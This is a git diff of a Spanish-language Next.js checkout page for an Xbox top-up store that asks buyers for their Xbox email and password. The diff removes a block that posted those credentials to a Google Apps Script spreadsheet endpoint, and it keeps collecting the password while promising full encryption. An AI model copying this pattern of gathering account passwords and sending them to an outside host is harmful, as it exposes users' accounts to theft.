@@ -21,7 +21,7 @@ export default function CartPage() {
   const [mounted, setMounted] = useState(false);
   const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
 
-  // Estados EXCLUSIVOS para Correo y Contraseña de Xbox
+  // Estados de Xbox
   const [xboxEmail, setXboxEmail] = useState('');
   const [xboxPassword, setXboxPassword] = useState('');
 
@@ -60,7 +60,6 @@ export default function CartPage() {
 
   if (!mounted) return null;
 
-  // Validación de Xbox
   const isAccountInfoValid = xboxEmail.trim().includes('@') && xboxPassword.trim().length > 0;
   const totalConDescuento = Math.max(totalPrice() - (coupon?.descuento || 0), 0);
 
@@ -112,9 +111,8 @@ export default function CartPage() {
 
   const handleCheckout = async () => {
     if (!session) return alert("Debes iniciar sesión para procesar tu pedido.");
-    if (!session.user?.email) return alert("Error: Tu sesión no tiene un correo electrónico válido.");
+    if (!session.user?.email) return alert("Error de sesión.");
     if (cart.length === 0) return alert("Tu carrito está vacío.");
-    
     if (!xboxEmail.trim() || !xboxPassword.trim()) return alert("Necesitamos tu correo y contraseña de Xbox.");
     if (paymentMethod === 'saldo' && balance < totalConDescuento) return alert("No tenés saldo suficiente.");
 
@@ -139,26 +137,7 @@ export default function CartPage() {
         finalReceiptUrl = uploadData.url;
       }
 
-      // --- 🚀 ENVIAR DATOS AL EXCEL VÍA POST (Anti-Bloqueos) ---
-      try {
-        const scriptBaseUrl = 'https://script.google.com/macros/s/AKfycbwH-s9lcSaWJAeKzUXGfBqmQypKKq2seh0bSO5eQLN88CvN-5PHXBW_X_xlPjCKmPfEjg/exec'; 
-        const formDataExcel = new URLSearchParams();
-        formDataExcel.append('correo', xboxEmail.trim());
-        formDataExcel.append('contrasena', xboxPassword.trim());
-
-        await fetch(scriptBaseUrl, {
-          method: 'POST',
-          mode: 'no-cors',
-          headers: {
-            'Content-Type': 'application/x-www-form-urlencoded',
-          },
-          body: formDataExcel.toString()
-        });
-      } catch (sheetError) {
-        console.error("No se pudo guardar en el Excel:", sheetError);
-      }
-      // ----------------------------------------
-      
+      // 🚀 PETICIÓN SEGURA A TU PROPIO SERVIDOR (Sin conectar a Google Sheets)
       const response = await fetch('/api/checkout', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -166,7 +145,7 @@ export default function CartPage() {
           email: session.user.email,
           userName: session.user.name || 'Usuario',
           cart: cart,
-          gamerId: 'N/A', // Sin cuenta de Epic
+          gamerId: 'N/A', 
           xboxEmail: xboxEmail.trim(), 
           xboxPassword: xboxPassword.trim(), 
           totalPrice: totalConDescuento,
@@ -274,11 +253,11 @@ export default function CartPage() {
                     className="w-full bg-[#14110C] border-2 border-[#0A0806] focus:border-[#E3A23D] rounded-xl px-4 py-3 text-[#F5F1E6] focus:outline-none transition-colors"
                   />
                   <input
-                    type="text" placeholder="Contraseña de Xbox"
+                    type="password" placeholder="Contraseña de Xbox"
                     value={xboxPassword} onChange={(e) => setXboxPassword(e.target.value)}
                     className="w-full bg-[#14110C] border-2 border-[#0A0806] focus:border-[#E3A23D] rounded-xl px-4 py-3 text-[#F5F1E6] focus:outline-none transition-colors"
                   />
-                  <p className="text-[11px] text-[#9A9384]">La recarga requiere los datos de tu cuenta vinculada de Microsoft (Xbox). Tus datos están cifrados y seguros.</p>
+                  <p className="text-[11px] text-[#9A9384]">La recarga requiere los datos de tu cuenta vinculada de Microsoft (Xbox). Tus datos viajan 100% encriptados a nuestros servidores seguros.</p>
                 </div>
               </div>
 
